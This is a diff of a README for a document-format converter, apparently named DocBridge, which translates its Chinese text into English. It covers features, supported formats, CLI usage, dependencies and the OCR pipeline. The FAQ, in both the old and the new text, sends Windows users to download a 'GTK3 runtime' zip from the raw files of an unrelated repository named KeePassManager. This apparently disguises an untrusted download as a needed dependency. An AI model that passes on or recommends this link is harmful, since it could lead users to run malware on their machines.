@@ -1,185 +1,168 @@
-# 格式转换器
+# DocBridge
 
-多功能文档格式转换工具，支持 PDF、DOCX、DOC、TXT 与 Markdown 之间的相互转换，特别支持**扫描件/图片型 PDF 的 OCR 识别**。
+**A lightweight document format converter with built-in OCR support.**
 
-![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
+Convert between PDF, DOCX, DOC, TXT and Markdown — with automatic detection and OCR extraction from scanned documents and image-based PDFs.
 
----
-
-## 功能特性
-
-- **多格式支持**：PDF、DOCX、DOC、TXT ↔ MD，MD → PDF/DOCX
-- **智能 OCR**：自动识别扫描件、图片型 PDF，无需手动选择
-- **多入口**：
-  - 🖥️ **桌面 GUI**（PyQt5）- 推荐，一键启动
-  - 🌐 **网页 GUI**（Gradio）- 浏览器访问
-  - ⌨️ **命令行**（CLI）- 适合自动化和批量处理
-- **批量转换**：支持文件夹递归扫描，批量处理大量文件
-- **跨平台**：支持 Windows、Linux、macOS
+[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
+[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 
 ---
 
-## 支持格式
+## Features
 
-| 输入格式 | 输出格式 | 说明 |
-|---------|---------|------|
-| PDF | MD | 文字型/矢量字体型自动处理 |
-| PDF | MD | **扫描件/图片型自动 OCR** |
-| DOCX | MD | Word 文档 |
-| DOC | MD | 老版 Word 文档 |
-| TXT | MD | 纯文本 |
-| MD | PDF | 需要 WeasyPrint |
-| MD | DOCX | Word 文档 |
+- **Multi-format conversion** — PDF, DOCX, DOC, TXT ↔ Markdown, Markdown → PDF/DOCX
+- **Smart OCR** — automatically detects and extracts text from scanned/image-based PDFs
+- **Three interfaces** — Desktop GUI (PyQt5), Web GUI (Gradio), CLI
+- **Batch processing** — recursive folder scanning for bulk conversions
+- **Cross-platform** — Windows, Linux, macOS
 
 ---
 
-## 快速开始
+## Supported Formats
 
-### 环境要求
+| Input | Output | Notes |
+|-------|--------|-------|
+| PDF | MD | Text-based or vector-font PDFs handled automatically |
+| PDF | MD | **Scanned/image-based PDFs → OCR recognition** |
+| DOCX | MD | Word documents |
+| DOC | MD | Legacy Word format |
+| TXT | MD | Plain text |
+| MD | PDF | Requires WeasyPrint |
+| MD | DOCX | Word documents |
+
+---
+
+## Quick Start
+
+### Requirements
 
 - Python 3.11+
-- Windows 10/11 或 Linux/macOS
+- Windows 10/11 / Linux / macOS
 
-### 安装依赖
+### Install dependencies
 
 ```bash
 pip install -r requirements.txt
 ```
 
-### 一键启动（Windows）
+### One-click launch (Windows)
 
-直接双击运行 `start.bat` 即可启动桌面 GUI。
+Double-click `start.bat` to launch the desktop GUI.
 
-### 其他启动方式
+### Other launch options
 
 ```bash
-# 桌面 GUI（推荐）
+# Desktop GUI (recommended)
 python src/gui_qt.py
 
-# 网页界面（浏览器访问）
+# Web interface (browser-based)
 python src/gui.py
 
-# 命令行
+# Command line
 python -m src.cli convert input.pdf output.md
 python -m src.cli batch "*.pdf" ./output/
 ```
 
 ---
 
-## 项目结构
+## Project Structure
 
 ```
-格式转换器/
+DocBridge/
 ├── src/
-│   ├── converters/          # 转换器核心
-│   │   ├── base.py         # 转换器基类
-│   │   ├── pdf_converter.py        # PDF → MD（文字型）
-│   │   ├── ocr_pdf_converter.py    # PDF → MD（OCR，扫描件）
+│   ├── converters/          # Converter core modules
+│   │   ├── base.py         # Base converter class
+│   │   ├── pdf_converter.py        # PDF → MD (text-based)
+│   │   ├── ocr_pdf_converter.py    # PDF → MD (OCR, scanned)
 │   │   ├── docx_converter.py       # DOCX → MD
 │   │   ├── doc_converter.py        # DOC → MD
 │   │   ├── txt_converter.py        # TXT → MD
 │   │   ├── md_to_pdf.py            # MD → PDF
 │   │   └── md_to_docx.py           # MD → DOCX
-│   ├── cli.py              # 命令行入口
-│   ├── gui.py              # Gradio 网页界面
-│   └── gui_qt.py           # PyQt5 桌面界面
-├── tests/                  # 测试文件
-├── docs/                   # 文档
-├── assets/                 # 资源文件
-├── requirements.txt        # Python 依赖
-├── start.bat               # Windows 一键启动
-├── start.sh                # Linux/macOS 启动脚本
+│   ├── cli.py              # CLI entry point
+│   ├── gui.py              # Gradio web interface
+│   └── gui_qt.py           # PyQt5 desktop interface
+├── tests/                  # Test files
+├── docs/                   # Documentation
+├── requirements.txt        # Python dependencies
+├── start.bat               # Windows launcher
+├── start.sh                # Linux/macOS launcher
 └── README.md
 ```
 
 ---
 
-## 依赖说明
+## Dependencies
 
-### 核心依赖
+### Core
 
-| 库 | 用途 |
-|----|------|
-| PyMuPDF | PDF 文本/图片提取 |
-| pdfminer.six | PDF 文本解析 |
-| python-docx | Word 文档读写 |
-| markdown | MD 文件解析 |
-| click | CLI 命令行框架 |
-| tqdm | 进度条 |
+| Package | Purpose |
+|---------|---------|
+| PyMuPDF | PDF text/image extraction |
+| pdfminer.six | PDF text parsing |
+| python-docx | Word document I/O |
+| markdown | Markdown parsing |
+| click | CLI framework |
+| tqdm | Progress bar |
 
-### 可选依赖
+### Optional
 
-| 库 | 用途 | 平台限制 |
-|----|------|---------|
-| RapidOCR | OCR 文字识别（扫描件） | 跨平台 |
-| weasyprint | MD → PDF | 需要 cairo/pango 系统库 |
-| PyQt5 | 桌面 GUI | 跨平台 |
-| gradio | 网页 GUI | 跨平台 |
+| Package | Purpose | Platform Notes |
+|---------|---------|----------------|
+| rapidocr-onnxruntime | OCR text recognition | Cross-platform |
+| weasyprint | MD → PDF | Requires cairo/pango system libs |
+| PyQt5 | Desktop GUI | Cross-platform |
+| gradio | Web GUI | Cross-platform |
 
 ---
 
-## 命令行用法
+## CLI Usage
 
 ```bash
-# 转换单个文件
+# Convert a single file
 python -m src.cli convert input.pdf output.md
 python -m src.cli convert input.md output.pdf
 python -m src.cli convert input.docx output.md
 
-# 批量转换
+# Batch conversion
 python -m src.cli batch "*.pdf" ./output/
 python -m src.cli batch "./documents/" ./md_files/ -r -e pdf -e docx
 
-# 查看支持格式
+# Show supported formats
 python -m src.cli info
 
-# 从 PDF 提取图片
+# Extract images from PDF
 python -m src.cli extract-images input.pdf -o ./images/
 ```
 
 ---
 
-## OCR 原理
+## How OCR Works
 
-当 PDF 文件被判定为**图片型（扫描件）**或**矢量字体异常**时，自动启用 OCR 流程：
+When a PDF is identified as **image-based (scanned)** or **vector-font with encoding issues**, DocBridge automatically switches to OCR:
 
-1. **自动检测**：统计 PDF 文字含量，低于阈值或每页平均字符<100 触发 OCR
-2. **页面渲染**：PyMuPDF 将每页 PDF 渲染为 150 DPI 高清图片
-3. **文字识别**：RapidOCR 对图片进行文字识别（支持中文、多语言）
-4. **结构重组**：按阅读顺序重组文字块，识别标题/列表/段落
-5. **输出 MD**：生成结构化的 Markdown 文件
-
----
-
-## 常见问题
-
-**Q: 扫描件 PDF 转换失败？**  
-A: 确保已安装 RapidOCR：`pip install rapidocr-onnxruntime`
-
-**Q: MD → PDF 报错？**  
-A: Windows 上 WeasyPrint 需要额外系统库，建议使用 `pip install weasyprint` 后安装 [GTK3 runtime](https://github.com/tsujan/KeePassManager/raw/master/extra/gtk3.zip)
-
-**Q: DOC 文件无法转换？**  
-A: 需要安装 `antiword`（Linux）或使用 LibreOffice 进行转换
+1. **Detection** — text content analysis; fewer than 100 chars/page triggers OCR
+2. **Rendering** — PyMuPDF renders each page as 150 DPI high-resolution image
+3. **Recognition** — RapidOCR extracts text from images (supports Chinese, English, multilingual)
+4. **Structuring** — text blocks are ordered by reading sequence; headings/lists/paragraphs are identified
+5. **Output** — structured Markdown file is generated
 
 ---
 
-## 开发相关
+## FAQ
 
-```bash
-# 安装开发依赖
-pip install -r requirements.txt
+**Q: Scanned PDF conversion fails?**  
+A: Install RapidOCR: `pip install rapidocr-onnxruntime`
 
-# 运行测试
-pytest tests/
+**Q: MD → PDF throws an error?**  
+A: On Windows, WeasyPrint needs GTK3 runtime. Run `pip install weasyprint` then install [GTK3](https://github.com/tsujan/KeePassManager/raw/master/extra/gtk3.zip).
 
-# 语法检查
-python -m py_compile src/**/*.py
-```
+**Q: DOC file won't convert?**  
+A: Requires `antiword` (Linux) or LibreOffice for DOC format support.
 
 ---
 
 ## License
 
-MIT License - 详见 [LICENSE](LICENSE) 文件
+MIT License — see [LICENSE](LICENSE)
